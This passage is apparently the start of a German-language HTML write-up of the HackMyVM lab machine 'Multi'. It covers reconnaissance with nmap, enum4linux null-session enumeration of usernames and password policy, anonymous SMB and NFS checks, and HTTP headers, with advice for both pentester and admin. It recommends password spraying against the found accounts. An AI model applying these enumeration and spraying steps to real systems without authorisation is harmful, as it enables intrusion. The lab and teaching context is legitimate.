@@ -1,0 +1,1487 @@
+﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Multi - HackMyVM - Hard - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body class="level-hard">
+
+    <div class="header-bg">
+        <h1>Multi - HackMyVM - Hard - Bericht</h1>
+        <div class="level-container">
+            <h2>Hard</h2>
+            <div class="circle">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">feroxbuster</div>
+                <div class="tool-item">ftp</div>
+                <div class="tool-item">enum4linux</div>
+                <div class="tool-item">smbclient</div>
+                <div class="tool-item">telnet</div>
+                <div class="tool-item">showmount</div>
+                <div class="tool-item">netcat (nc)</div>
+                <div class="tool-item">psql</div>
+                <div class="tool-item">redis-cli</div>
+                <div class="tool-item">cupp</div>
+                <div class="tool-item">dnsmasq</div>
+                <div class="tool-item">ssh</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#initial-access">Initial Access</a></li>
+                <li><a href="#proof-of-concept">Proof of Concept</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿Hackerben)-[~]
+└─# <span class="command">./recon.sh multi.hmv</span></div>
+                    <pre>
+192.168.2.185	08:00:27:49:1c:63	PCS Systemtechnik GmbH   multi.hmv
+ 
+
+▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
+:::::::::::::::::::::: Nmap nur offene Ports Ausgabe :::::::::::::::::::::::
+▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
+
+<span class="command">21/tcp    open  ftp         vsftpd 3.0.3</span>
+<span class="command">22/tcp    open  ssh         OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)</span>
+<span class="command">23/tcp    open  telnet      Linux telnetd</span>
+<span class="command">80/tcp    open  http        Apache httpd 2.4.62 ((Debian))</span>
+<span class="command">111/tcp   open  rpcbind     2-4 (RPC #100000)</span>
+<span class="command">139/tcp   open  netbios-ssn Samba smbd 4</span>
+<span class="command">445/tcp   open  netbios-ssn Samba smbd 4</span>
+<span class="command">2049/tcp  open  nfs         3-4 (RPC #100003)</span>
+<span class="command">3306/tcp  open  mysql       MariaDB 10.3.23 or earlier (unauthorized)</span>
+<span class="command">28080/tcp open  http        Werkzeug httpd 3.1.3 (Python 3.9.2)</span>
+<span class="command">34187/tcp open  mountd      1-3 (RPC #100005)</span>
+<span class="command">39075/tcp open  mountd      1-3 (RPC #100005)</span>
+<span class="command">40527/tcp open  nlockmgr    1-4 (RPC #100021)</span>
+<span class="command">44545/tcp open  mountd      1-3 (RPC #100005)</span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der erste Schritt war die Ausführung eines benutzerdefinierten Reconnaissance-Skripts (`recon.sh`) gegen das Ziel `multi.hmv`. Das Skript identifizierte erfolgreich die IP-Adresse des Ziels als `192.168.2.185`. Anschließend führte es einen schnellen Nmap-Scan durch, um eine erste Übersicht der offenen TCP-Ports zu erhalten. Die Ausgabe zeigt eine außergewöhnlich große Anzahl an offenen Diensten, was auf ein komplexes System mit vielen potenziellen Angriffsvektoren hindeutet.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Entdeckung so vieler offener Ports ist ein kritisches Ergebnis. Jeder Dienst stellt eine eigene Angriffsfläche dar. Besonders hervorzuheben sind veraltete oder unsichere Protokolle wie FTP (Port 21) und Telnet (Port 23), Webserver auf den Ports 80 (Apache) und 28080 (Python Werkzeug), Datenbankdienste (MySQL/MariaDB auf Port 3306) sowie Dateifreigabedienste (Samba auf 139/445 und NFS auf 2049). Diese Vielfalt erfordert eine methodische und priorisierte Untersuchung jedes einzelnen Dienstes.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die nächsten Schritte sollten eine detaillierte Untersuchung jedes einzelnen Dienstes beinhalten. Dazu gehören Versionsscans, die Suche nach bekannten Schwachstellen (CVEs), die Enumeration von SMB- und NFS-Freigaben sowie eine gründliche Analyse der Webanwendungen. Die Ports 21, 23, 139/445 und 2049 sollten zuerst auf anonymen Zugriff und Fehlkonfigurationen geprüft werden.
+<br><strong>Empfehlung (Admin):</strong> Die Angriffsfläche des Systems sollte drastisch reduziert werden. Jeder nicht zwingend benötigte Dienst muss deaktiviert werden. Für die verbleibenden Dienste sollten die Zugriffsrechte strikt kontrolliert und, wo immer möglich, durch sicherere Alternativen ersetzt werden (z.B. SFTP statt FTP, SSH statt Telnet). Eine Netzwerk-Firewall sollte den Zugriff auf die notwendigen Ports auf ein Minimum beschränken.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
+::::::::::::::::::::::::::::: Nmap volle Ausgabe :::::::::::::::::::::::::::
+▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
+
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-01 22:11 CEST
+Nmap scan report for Multi (192.168.2.185)
+Host is up (0.00012s latency).
+Not shown: 65521 closed tcp ports (reset)
+PORT      STATE SERVICE     VERSION
+<span class="command">21/tcp    open  ftp         vsftpd 3.0.3</span>
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=ftp-server/organizationName=MyOrganization/stateOrProvinceName=Beijing/countryName=CN
+| Not valid before: 2025-07-17T11:34:00
+|_Not valid after:  2035-07-15T11:34:00
+<span class="command">22/tcp    open  ssh         OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)</span>
+| ssh-hostkey: 
+|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
+|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
+|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
+<span class="command">23/tcp    open  telnet      Linux telnetd</span>
+<span class="command">80/tcp    open  http        Apache httpd 2.4.62 ((Debian))</span>
+|_http-server-header: Apache/2.4.62 (Debian)
+|_http-title: Apache2 Debian Default Page: It works
+<span class="command">111/tcp   open  rpcbind     2-4 (RPC #100000)</span>
+| rpcinfo: 
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100000  3,4          111/tcp6  rpcbind
+|   100000  3,4          111/udp6  rpcbind
+|   100005  1,2,3      34187/tcp   mountd
+|   100005  1,2,3      36327/tcp6  mountd
+|   100005  1,2,3      45926/udp6  mountd
+|   100005  1,2,3      57575/udp   mountd
+|   100227  3           2049/tcp   nfs_acl
+|   100227  3           2049/tcp6  nfs_acl
+|   100227  3           2049/udp   nfs_acl
+|_  100227  3           2049/udp6  nfs_acl
+<span class="command">139/tcp   open  netbios-ssn Samba smbd 4</span>
+<span class="command">445/tcp   open  netbios-ssn Samba smbd 4</span>
+<span class="command">2049/tcp  open  nfs_acl     3 (RPC #100227)</span>
+<span class="command">3306/tcp  open  mysql       MariaDB 10.3.23 or earlier (unauthorized)</span>
+<span class="command">28080/tcp open  http        Werkzeug httpd 3.1.3 (Python 3.9.2)</span>
+|_http-server-header: Werkzeug/3.1.3 Python/3.9.2
+|_http-title: Admin Panel
+<span class="command">34187/tcp open  mountd      1-3 (RPC #100005)</span>
+<span class="command">39075/tcp open  mountd      1-3 (RPC #100005)</span>
+<span class="command">40527/tcp open  nlockmgr    1-4 (RPC #100021)</span>
+<span class="command">44545/tcp open  mountd      1-3 (RPC #100005)</span>
+MAC Address: 08:00:27:49:1C:63 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+Device type: general purpose|router
+Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
+OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
+Network Distance: 1 hop
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+| smb2-time: 
+|   date: 2025-10-01T20:12:02
+|_  start_date: N/A
+|_nbstat: NetBIOS name: MULTI, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled but not required
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.12 ms Multi (192.168.2.185)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 23.96 seconds
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ein detaillierter Nmap-Scan mit Versionserkennung (`-sV`), Skript-Scans (`-sC`) und Betriebssystemerkennung (`-O`) bestätigt und erweitert die ersten Ergebnisse. Wir erhalten exakte Versionsnummern für kritische Dienste wie `vsftpd 3.0.3`, `OpenSSH 8.4p1`, `Apache httpd 2.4.62` und `Werkzeug httpd 3.1.3`. Die `rpcinfo`-Ausgabe zeigt detailliert die registrierten RPC-Dienste, was für die NFS-Enumeration entscheidend ist. Die SMB-Skripte verraten den NetBIOS-Namen `MULTI` und dass Message Signing zwar aktiviert, aber nicht erzwungen wird. Die Betriebssystemerkennung deutet auf einen Linux-Kernel der Version 4.x oder 5.x hin.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Diese detaillierten Informationen sind Gold wert. Jede Versionsnummer kann nun gezielt mit öffentlichen Schwachstellen-Datenbanken (wie CVE Details oder Exploit-DB) abgeglichen werden. Die Information, dass der MySQL-Port als `(unauthorized)` markiert ist, deutet auf einen möglichen direkten Zugriff ohne Passwort hin, was eine hohe Priorität für die weitere Untersuchung darstellt. Der Werkzeug-Server ist oft ein Indikator für eine benutzerdefinierte Python-Anwendung, die anfällig für spezifische Web-Schwachstellen sein könnte.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führe eine gezielte Suche nach Exploits für `vsftpd 3.0.3` durch (historisch gab es kritische Lücken). Versuche, dich ohne Passwort mit der MariaDB auf Port 3306 zu verbinden. Untersuche die Webanwendung auf Port 28080 intensiv auf häufige Schwachstellen wie SQL-Injection, Template-Injection oder Command-Injection. Führe eine gründliche Enumeration der Samba- und NFS-Dienste durch.
+<br><strong>Empfehlung (Admin):</strong> Alle Dienste sollten auf die neuesten, stabilen Versionen aktualisiert werden, um bekannte Schwachstellen zu schließen. Der Zugriff auf die MariaDB muss zwingend durch ein starkes Passwort geschützt werden. Der Telnet-Dienst sollte sofort deaktiviert werden. Für den FTP-Dienst ist zu prüfen, ob er wirklich benötigt wird; falls ja, sollte er durch eine sichere Konfiguration und Benutzer-Jails abgesichert werden.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿Hackerben)-[~]
+└─# <span class="command">ftp 192.168.2.185</span></div>
+                    <pre>
+Connected to 192.168.2.185.
+220 (vsFTPd 3.0.3)
+Name (192.168.2.185:hackerben): anonymous
+<span class="password">530 Permission denied.</span>
+ftp: Login failed
+ftp&gt; 
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Hier wurde ein manueller Versuch unternommen, sich über FTP auf Port 21 mit dem Zielserver zu verbinden. Es wurde der Standardbenutzername `anonymous` für den anonymen Login verwendet. Der Server antwortete prompt mit der Meldung `530 Permission denied`, was den Anmeldeversuch sofort beendete.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das ist eine positive Sicherheitskonfiguration. Der FTP-Server lässt keinen anonymen Zugriff zu. Dies schließt eine der häufigsten und einfachsten Einfallstore. Obwohl dies gut ist, bleibt der Dienst selbst eine potenzielle Angriffsfläche, falls gültige Anmeldedaten gefunden werden oder der Dienst selbst eine Schwachstelle aufweist. Der Fokus verlagert sich nun von anonymem Zugriff auf das Erraten oder anderweitige Erlangen von Benutzerdaten.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nachdem der anonyme Zugang verwehrt wurde, sollten Brute-Force-Angriffe auf den FTP-Dienst nur mit Vorsicht und unter Berücksichtigung potenzieller Account-Sperrungen durchgeführt werden. Es ist effizienter, zuerst nach Benutzernamen auf dem System zu suchen (z.B. über SMB, Web-Leaks) und diese dann gezielt gegen den FTP-Dienst zu testen.
+<br><strong>Empfehlung (Admin):</strong> Die Deaktivierung des anonymen FTP-Zugriffs ist eine korrekte und wichtige Maßnahme. Zusätzlich sollte ein Intrusion-Detection-System (IDS) wie `fail2ban` implementiert werden, um Brute-Force-Angriffe automatisch zu erkennen und die IP-Adressen der Angreifer zu blockieren.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿Hackerben)-[~]
+└─# <span class="command">enum4linux -a 192.168.2.185</span></div>
+                    <pre>
+Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Wed Oct  1 22:32:12 2025
+
+ =========================================( Target Information )=========================================
+
+Target ........... 192.168.2.185
+RID Range ........ 500-550,1000-1050
+Username ......... ''
+Password ......... ''
+Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
+
+
+ ===========================( Enumerating Workgroup/Domain on 192.168.2.185 )===========================
+
+
+[+] Got domain/workgroup name: <span class="command">SECUREGROUP</span>
+
+
+ ===============================( Nbtstat Information for 192.168.2.185 )===============================
+
+Looking up status of 192.168.2.185
+	MULTI           &lt;00&gt; -         B &lt;ACTIVE&gt;  Workstation Service
+	MULTI           &lt;03&gt; -         B &lt;ACTIVE&gt;  Messenger Service
+	MULTI           &lt;20&gt; -         B &lt;ACTIVE&gt;  File Server Service
+	..__MSBROWSE__. &lt;01&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Master Browser
+	SECUREGROUP     &lt;00&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Domain/Workgroup Name
+	SECUREGROUP     &lt;1d&gt; -         B &lt;ACTIVE&gt;  Master Browser
+	SECUREGROUP     &lt;1e&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Browser Service Elections
+
+	MAC Address = 00-00-00-00-00-00
+
+ ===================================( Session Check on 192.168.2.185 )===================================
+
+
+[+] Server 192.168.2.185 allows sessions using username '', password ''
+
+
+ ================================( Getting domain SID for 192.168.2.185 )================================
+
+Domain Name: SECUREGROUP
+Domain Sid: (NULL SID)
+
+[+] Can't determine if host is part of domain or part of a workgroup
+
+
+ ==================================( OS information on 192.168.2.185 )==================================
+
+
+[E] Can't get OS info with smbclient
+
+
+[+] Got OS info for 192.168.2.185 from srvinfo: 
+	MULTI          Wk Sv PrQ Unx NT SNT Secure Samba Server
+	platform_id     :	500
+	os version      :	6.1
+	server type     :	0x809a03
+
+
+ =======================================( Users on 192.168.2.185 )=======================================
+
+Use of uninitialized value $users in print at ./enum4linux.pl line 972.
+Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 975.
+
+Use of uninitialized value $users in print at ./enum4linux.pl line 986.
+Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 988.
+
+ =================================( Share Enumeration on 192.168.2.185 )=================================
+
+smbXcli_negprot_smb1_done: No compatible protocol selected by server.
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	<span class="command">secure_share</span>    Disk      
+	IPC$            IPC       IPC Service (Secure Samba Server)
+Reconnecting with SMB1 for workgroup listing.
+Protocol negotiation to server 192.168.2.185 (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE
+Unable to connect with SMB1 -- no workgroup available
+
+[+] Attempting to map shares on 192.168.2.185
+
+//192.168.2.185/secure_share	Mapping: OK Listing: OK Writing: N/A
+
+[E] Can't understand response:
+
+NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
+//192.168.2.185/IPC$	Mapping: N/A Listing: N/A Writing: N/A
+
+ ===========================( Password Policy Information for 192.168.2.185 )===========================
+
+
+[E] Unexpected error from polenum:
+
+
+
+[+] Attaching to 192.168.2.185 using a NULL share
+
+[+] Trying protocol 139/SMB...
+
+	[!] Protocol failed: ('unpack requires a buffer of 1 bytes', "When unpacking field 'SecurityMode | &lt;B | b''[:1]'")
+
+[+] Trying protocol 445/SMB...
+
+	[!] Protocol failed: SMB SessionError: STATUS_NOT_SUPPORTED(The request is not supported.)
+
+
+
+[+] Retieved partial password policy with rpcclient:
+
+
+<span class="command">Password Complexity: Disabled</span>
+<span class="command">Minimum Password Length: 5</span>
+
+
+ ======================================( Groups on 192.168.2.185 )======================================
+
+
+[+] Getting builtin groups:
+
+
+[+]  Getting builtin group memberships:
+
+
+[+]  Getting local groups:
+
+
+[+]  Getting local group memberships:
+
+
+[+]  Getting domain groups:
+
+
+[+]  Getting domain group memberships:
+
+
+ ==================( Users on 192.168.2.185 via RID cycling (RIDS: 500-550,1000-1050) )==================
+
+
+[I] Found new SID: 
+S-1-22-1
+
+[I] Found new SID: 
+S-1-5-32
+
+[I] Found new SID: 
+S-1-5-32
+
+[I] Found new SID: 
+S-1-5-32
+
+[I] Found new SID: 
+S-1-5-32
+
+[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
+
+<span class="command">S-1-22-1-1000 Unix User\todd (Local User)</span>
+<span class="command">S-1-22-1-1001 Unix User\xiao (Local User)</span>
+<span class="command">S-1-22-1-1002 Unix User\secure_user (Local User)</span>
+<span class="command">S-1-22-1-1003 Unix User\samba_user (Local User)</span>
+
+[+] Enumerating users using SID S-1-5-32 and logon username '', password ''
+
+S-1-5-32-544 BUILTIN\Administrators (Local Group)
+S-1-5-32-545 BUILTIN\Users (Local Group)
+S-1-5-32-546 BUILTIN\Guests (Local Group)
+S-1-5-32-547 BUILTIN\Power Users (Local Group)
+S-1-5-32-548 BUILTIN\Account Operators (Local Group)
+S-1-5-32-549 BUILTIN\Server Operators (Local Group)
+S-1-5-32-550 BUILTIN\Print Operators (Local Group)
+
+[+] Enumerating users using SID S-1-5-21-2648146443-3642655822-4195795931 and logon username '', password ''
+
+S-1-5-21-2648146443-3642655822-4195795931-501 MULTI\nobody (Local User)
+S-1-5-21-2648146443-3642655822-4195795931-513 MULTI\None (Domain Group)
+
+ ===============================( Getting printer info for 192.168.2.185 )===============================
+
+No printers returned.
+
+
+enum4linux complete on Wed Oct  1 22:32:23 2025
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Das Tool `enum4linux` wurde verwendet, um eine umfassende Enumeration des Samba-Dienstes durchzuführen. Es konnte eine "Null-Session" etablieren, was bedeutet, dass es sich ohne gültige Anmeldeinformationen mit dem Dienst verbinden konnte. Dies ermöglichte die Gewinnung wertvoller Informationen. Die wichtigsten Funde sind: der Arbeitsgruppenname `SECUREGROUP`, eine lesbare SMB-Freigabe namens `secure_share`, eine schwache Passwortrichtlinie (min. 5 Zeichen, keine Komplexität) und eine Liste von vier potenziellen Benutzernamen: `todd`, `xiao`, `secure_user` und `samba_user`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist ein kritischer Informationsgewinn. Das Zulassen von Null-Sessions ist eine schwere Fehlkonfiguration, die einem Angreifer einen tiefen Einblick in die Systemstruktur gibt. Die aufgedeckten Benutzernamen sind die Grundlage für alle weiteren Angriffe, die auf Authentifizierung basieren (z.B. Brute-Force gegen SSH, Telnet, FTP). Die offene Freigabe `secure_share` ist ein primäres Ziel für die weitere Untersuchung auf sensible Daten. Die schwache Passwortrichtlinie erhöht die Erfolgswahrscheinlichkeit von Passwort-Spraying- oder Brute-Force-Angriffen erheblich.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuche, als Nächstes anonym auf die Freigabe `secure_share` zuzugreifen, um deren Inhalt zu untersuchen. Erstelle eine Benutzerliste (`todd`, `xiao`, `secure_user`) und verwende sie für gezielte Passwort-Spraying-Angriffe gegen die Dienste SSH und Telnet. Die schwache Passwortrichtlinie legt nahe, einfache und kurze Passwörter zu versuchen.
+<br><strong>Empfehlung (Admin):</strong> Null-Sessions müssen umgehend in der Samba-Konfigurationsdatei (`smb.conf`) deaktiviert werden, um die anonyme Enumeration zu unterbinden. Implementieren Sie eine starke Passwortrichtlinie, die eine Mindestlänge von 12 Zeichen, Komplexität (Groß-/Kleinbuchstaben, Zahlen, Sonderzeichen) und einen Passwortverlauf erzwingt. Der Zugriff auf die Freigabe `secure_share` muss auf authentifizierte und autorisierte Benutzer beschränkt werden.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿Hackerben)-[~]
+└─# <span class="command">smbclient //192.168.2.185/secure_share -U admin -N</span></div>
+                    <pre>
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Fri Jul 18 17:22:38 2025
+  ..                                  D        0  Thu Jul 17 13:40:23 2025
+  bettercap                           N      159  Fri Jul 18 17:22:38 2025
+
+		29801344 blocks of size 1024. 24338232 blocks available
+smb: \> get bettercap 
+getting file \bettercap of size 159 as bettercap (155,3 KiloBytes/sec) (average 155,3 KiloBytes/sec)
+smb: \> put recon.sh 
+<span class="password">NT_STATUS_ACCESS_DENIED opening remote file \recon.sh</span>
+smb: \> 
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Hier wurde versucht, auf die zuvor mit `enum4linux` entdeckte SMB-Freigabe `secure_share` zuzugreifen. Der `smbclient` wurde mit der Option `-N` für einen passwortlosen (anonymen) Login verwendet. Der Zugriff war erfolgreich, und der Befehl `ls` listete den Inhalt der Freigabe auf, der eine Datei namens `bettercap` enthielt. Diese Datei wurde erfolgreich heruntergeladen. Ein anschließender Versuch, eine Datei auf die Freigabe hochzuladen (`put recon.sh`), schlug mit `NT_STATUS_ACCESS_DENIED` fehl.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies bestätigt, dass die Freigabe anonym lesbar, aber nicht schreibbar ist. Dies ist eine häufige Fehlkonfiguration. Obwohl wir keine Dateien hochladen können, um möglicherweise Code auszuführen, könnten die lesbaren Dateien sensible Informationen enthalten. Die Datei `bettercap` muss als Nächstes untersucht werden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Analysiere den Inhalt der heruntergeladenen `bettercap`-Datei. Sie könnte Konfigurationsdetails, Passwörter oder andere Hinweise enthalten, die für den weiteren Angriff nützlich sind.
+<br><strong>Empfehlung (Admin):</strong> Anonym lesbare SMB-Freigaben sollten vermieden werden, es sei denn, sie sind explizit für öffentliche Informationen vorgesehen. Der Zugriff auf alle Freigaben sollte standardmäßig eine Authentifizierung erfordern. Überprüfen Sie die Konfiguration in `smb.conf` und setzen Sie `guest ok = no` für private Freigaben.</p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿Hackerben)-[~]
+└─# <span class="command">showmount -e 192.168.2.185</span></div>
+                    <pre>
+Export list for 192.168.2.185:
+<span class="command">/srv/nfs_secure 127.0.0.1</span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `showmount -e` wurde ausgeführt, um den NFS-Server auf dem Ziel nach exportierten (freigegebenen) Verzeichnissen abzufragen. Das Ergebnis zeigt, dass das Verzeichnis `/srv/nfs_secure` exportiert wird, der Zugriff jedoch auf `127.0.0.1` (localhost) beschränkt ist.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Auf den ersten Blick scheint diese Konfiguration sicher zu sein, da sie den direkten Zugriff von unserer Angreifer-IP aus verhindert. Es ist jedoch eine wichtige Information für eine spätere Phase des Angriffs. Sollten wir einen initialen Zugriff auf das System erlangen (z.B. als ein niedrig privilegierter Benutzer), könnten wir von der Maschine selbst aus auf diese NFS-Freigabe zugreifen. Dies könnte ein Vektor für Privilege Escalation sein, falls die Freigabe falsch konfiguriert ist (z.B. mit `no_root_squash`).</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Notiere diese Information für die Post-Exploitation-Phase. Sobald ein Shell-Zugang besteht, sollte sofort versucht werden, diese Freigabe lokal zu mounten und deren Inhalt und Berechtigungen zu untersuchen.
+<br><strong>Empfehlung (Admin):</strong> Die Beschränkung der NFS-Freigabe auf localhost ist eine gute Sicherheitspraxis. Überprüfen Sie zusätzlich die Export-Optionen in `/etc/exports`, um sicherzustellen, dass Optionen wie `root_squash` korrekt gesetzt sind, um zu verhindern, dass ein lokaler Root-Benutzer auf der Freigabe als Root agieren kann.</p>
+        </section>
+		
+		
+		<!-- #teil 2 -->
+		
+		<section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
+::::::::::::::::::::::::: HTTP Records Permissions :::::::::::::::::::::::::
+▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
+
+<span class="command">Allow: GET,POST,OPTIONS,HEAD</span>
+
+▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
+::::::::::::::::::::::::: HTTP-Header Verbose Scan :::::::::::::::::::::::::
+▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
+
+*   Trying 192.168.2.185:80...
+* Connected to 192.168.2.185 (192.168.2.185) port 80
+* using HTTP/1.x
+&gt; HEAD / HTTP/1.1
+&gt; Host: 192.168.2.185
+&gt; User-Agent: curl/8.15.0
+&gt; Accept: */*
+&gt; 
+* Request completely sent off
+&lt; HTTP/1.1 200 OK
+HTTP/1.1 200 OK
+&lt; Date: Wed, 01 Oct 2025 20:12:37 GMT
+Date: Wed, 01 Oct 2025 20:12:37 GMT
+&lt; <span class="command">Server: Apache/2.4.62 (Debian)</span>
+Server: Apache/2.4.62 (Debian)
+&lt; Last-Modified: Thu, 17 Jul 2025 11:55:20 GMT
+Last-Modified: Thu, 17 Jul 2025 11:55:20 GMT
+&lt; ETag: "2cb-63a1eaf063a31"
+ETag: "2cb-63a1eaf063a31"
+&lt; Accept-Ranges: bytes
+Accept-Ranges: bytes
+&lt; Content-Length: 10699
+Content-Length: 10699
+&lt; Vary: Accept-Encoding
+Vary: Accept-Encoding
+&lt; Content-Type: text/html
+Content-Type: text/html
+&lt; 
+
+* Connection #0 to host 192.168.2.185 left intact
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Diese Ausgabe stammt von einem `curl`-Befehl, der eine `HEAD`-Anfrage an den Webserver auf Port 80 sendet. Wir sehen die erlaubten HTTP-Methoden (`GET`, `POST`, `OPTIONS`, `HEAD`) und die detaillierten HTTP-Header der Antwort. Der `Server`-Header bestätigt, dass es sich um einen `Apache/2.4.62 (Debian)` handelt. Wir sehen auch Metadaten wie das Datum der letzten Änderung und den Content-Typ.</p>
